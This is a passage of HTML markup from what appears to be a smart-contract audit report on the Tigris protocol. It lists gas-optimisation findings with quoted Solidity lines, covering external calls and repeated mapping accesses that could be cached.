class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">104</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit balanceOf()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">114</span><span class=\"mtk1\">:              </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balanceBefore</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit claim()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">115</span><span class=\"mtk1\">:              </span><span class=\"mtk11\">IGovNFT</span><span class=\"mtk1\">(</span><span class=\"mtk12\">govNFT</span><span class=\"mtk1\">).</span><span class=\"mtk11\">claim</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit balanceOf()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">116</span><span class=\"mtk1\">:              </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balanceAfter</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit approve()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">117</span><span class=\"mtk1\">:              </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bondNFT</span><span class=\"mtk1\">), </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L39</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"102\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StableVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit transferFrom()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">46</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit decimals()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">49</span><span class=\"mtk1\">:               </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">*(</span><span class=\"mtk7\">10</span><span class=\"mtk1\">**(</span><span class=\"mtk7\">18</span><span class=\"mtk1\">-</span><span class=\"mtk11\">IERC20Mintable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">()))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit decimals()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">67</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">_output</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">/</span><span class=\"mtk7\">10</span><span class=\"mtk1\">**(</span><span class=\"mtk7\">18</span><span class=\"mtk1\">-</span><span class=\"mtk11\">IERC20Mintable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit transfer()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">68</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L46</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"103\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Trading</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit stable()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">175</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IStableVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tradeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stableVault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">stable</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit stable()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">324</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IStableVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tradeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stableVault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">stable</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit transfer()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">588</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit decimals()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">650</span><span class=\"mtk1\">:              </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_marginDecMultiplier</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**(</span><span class=\"mtk7\">18</span><span class=\"mtk1\">-</span><span class=\"mtk11\">ExtendedIERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_marginAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit transferFrom()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">651</span><span class=\"mtk1\">:              </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_marginAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_trader</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_margin</span><span class=\"mtk1\">/</span><span class=\"mtk12\">_marginDecMultiplier</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit approve()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">652</span><span class=\"mtk1\">:              </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_marginAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_stableVault</span><span class=\"mtk1\">, </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit transfer()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">671</span><span class=\"mtk1\">:              </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_outputToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">trader</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_toMint</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit balanceOf()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">673</span><span class=\"mtk1\">:              </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_balBefore</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_outputToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit withdraw()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">674</span><span class=\"mtk1\">:              </span><span class=\"mtk11\">IStableVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_stableVault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_outputToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_toMint</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit balanceOf()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit decimals()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">675</span><span class=\"mtk1\">:              </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_outputToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) != </span><span class=\"mtk12\">_balBefore</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_toMint</span><span class=\"mtk1\">/(</span><span class=\"mtk7\">10</span><span class=\"mtk1\">**(</span><span class=\"mtk7\">18</span><span class=\"mtk1\">-</span><span class=\"mtk11\">ExtendedIERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_outputToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">()))) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">BadWithdraw</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit transfer()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit balanceOf()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">676</span><span class=\"mtk1\">:              </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_outputToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">trader</span><span class=\"mtk1\">, </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_outputToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) - </span><span class=\"mtk12\">_balBefore</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit balanceOf()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">749</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">gov</span><span class=\"mtk1\">.</span><span class=\"mtk11\">distribute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">, </span><span class=\"mtk11\">IStable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit approve()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">807</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">IStable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gov</span><span class=\"mtk1\">), </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit stable()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit allowed()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">877</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">IStableVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_stableVault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">stable</span><span class=\"mtk1\">() || </span><span class=\"mtk11\">IStableVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_stableVault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">allowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Token not approved in vault&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L175</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"104\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TradingLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit trades()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">77</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">IPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Trade</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_trade</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_positions</span><span class=\"mtk1\">).</span><span class=\"mtk11\">trades</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit recover()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">102</span><span class=\"mtk1\">           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_provider</span><span class=\"mtk1\"> = (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">103</span><span class=\"mtk1\">               </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_priceData</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">104</span><span class=\"mtk1\">:          ).</span><span class=\"mtk11\">toEthSignedMessageHash</span><span class=\"mtk1\">().</span><span class=\"mtk11\">recover</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_signature</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit latestAnswer()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">:              </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assetChainlinkPriceInt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_chainlinkFeed</span><span class=\"mtk1\">).</span><span class=\"mtk11\">latestAnswer</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit decimals()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">115</span><span class=\"mtk1\">:                  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assetChainlinkPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assetChainlinkPriceInt</span><span class=\"mtk1\">) * </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**(</span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk11\">IPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_chainlinkFeed</span><span class=\"mtk1\">).</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">());</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/TradingLibrary.sol#L77</p>\n<h2 id=\"g07--multiple-accesses-of-a-mappingarray-should-use-a-local-variable-cache\" style=\"position:relative;\"><a href=\"#g07--multiple-accesses-of-a-mappingarray-should-use-a-local-variable-cache\" aria-label=\"g07  multiple accesses of a mappingarray should use a local variable cache permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑07]  Multiple accesses of a mapping/array should use a local variable cache</h2>\n<p>The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping’s value in a local <code>storage</code> or <code>calldata</code> variable when the value is accessed <a href=\"https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0\">multiple times</a>, saves <strong>~42 gas per access</strong> due to not having to recalculate the key’s keccak256 hash (Gkeccak256 - <strong>30 gas</strong>) and that calculation’s associated stack operations. Caching an array’s struct avoids recalculating the array offsets into memory/calldata</p>\n<p><em>There are 39 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"105\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PairsContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _idToAsset[_asset] on line 34</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">36</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">_idToAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">chainlinkFeed</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_feed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _idToAsset[_asset] on line 49</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">55</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">_idToAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">name</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_name</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _idToAsset[_asset] on line 55</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">57</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">_idToAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">chainlinkFeed</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_chainlinkFeed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _idToAsset[_asset] on line 57</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">59</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">_idToAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">minLeverage</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_minLeverage</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _idToAsset[_asset] on line 59</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">_idToAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">maxLeverage</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_maxLeverage</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _idToAsset[_asset] on line 60</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">61</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">_idToAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">feeMultiplier</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_feeMultiplier</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _idToAsset[_asset] on line 61</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">62</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">_idToAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span 